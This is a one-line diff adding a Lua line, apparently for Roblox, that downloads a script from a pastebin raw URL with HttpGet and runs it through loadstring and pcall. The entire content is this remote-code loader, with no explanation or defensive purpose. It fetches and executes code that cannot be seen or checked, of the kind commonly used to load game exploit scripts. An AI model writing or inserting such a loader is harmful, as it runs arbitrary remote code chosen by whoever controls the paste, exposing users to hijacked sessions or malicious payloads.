@@ -1,0 +1,1 @@
+pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
